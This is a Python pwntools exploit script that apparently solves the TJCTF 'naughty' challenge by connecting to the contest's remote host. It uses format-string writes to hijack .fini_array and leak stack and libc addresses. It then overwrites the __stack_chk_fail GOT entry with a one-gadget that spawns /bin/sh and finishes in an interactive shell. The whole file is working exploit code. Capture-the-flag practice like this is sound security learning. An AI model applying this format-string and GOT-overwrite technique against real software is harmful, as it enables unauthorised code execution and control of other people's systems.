from pwn import *

sh=remote("p1.tjctf.org",8004)
# sh= process("./naughty")
exe=ELF("naughty")

libc=ELF("libc6-i386_2.27-3ubuntu1_amd64.so")
# libc=ELF("/usr/lib32/libc-2.30.so")

# [19] .init_array
#        INIT_ARRAY      08049ba8 000ba8 000004 04   0   0  4
#        [00000003]: WRITE, ALLOC
# [20] .fini_array
#        FINI_ARRAY      08049bac 000bac 000004 04   0   0  4
#        [00000003]: WRITE, ALLOC

# start 0x8048420

p= p32(0x8049bac) 	# .fini_array
p+='%33820x%7$hn'   # 0x8420
p+= 'stack %72$p' 		# leak stack
p+= ' %75$p'			# leak libc_start_main + 241
sh.sendlineafter("name?\n",p)

sh.recvuntil("stack ")

leak = sh.recvline().split()
leak_libc_start_main = int(leak[1],16) # libc_start_main + 241
leak_canary = int(leak[0],16)			   # address stack from return + 4	
log.info("__libc_start_main +241 :	{}".format(hex(leak_libc_start_main)))
log.info("stack canary 		:	{}".format(hex(leak_canary)))

# 0x67a7f execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

libc_base=leak_libc_start_main - libc.sym["__libc_start_main"] -241
log.info("libc base  :	{}".format(hex(libc_base)))
bin_sh= libc_base + 0x6729f # use libc6-i386_2.27-3ubuntu1_amd64.so
offset_1= eval('0x' + hex(bin_sh)[6:])
offset_2 = eval('0x' + hex(bin_sh)[2:6])

offset_1= offset_1 - 12
offset_2= offset_2 - offset_1 - 12

log.info("/bin/sh : {}".format(hex(bin_sh)))
log.info("offset_1 : {}".format(hex(offset_1)))
log.info("offset_2 : {}".format(hex(offset_2)))

# 0x8049cbc = 0x080483e6 __stack_chk_fail@got 
p= p32(0x8049cbc) 					# __stack_chk_fail@got
p+= p32(0x8049cbc+2) 				# __stack_chk_fail@got +2
p+= p32(leak_canary-368-9*4) 		# address canary
p+= '%{:d}x%7$hn'.format(offset_1)  # overwrite got to bin_sh
p+= '%{:d}x%8$hn'.format(offset_2) 	# overwrite	got to bin_sh
p+= '%x%9$hn finish'				# overwrite address canary

gdb.attach(sh)
sh.sendline(p)
sh.recvuntil("finish")
sh.interactive()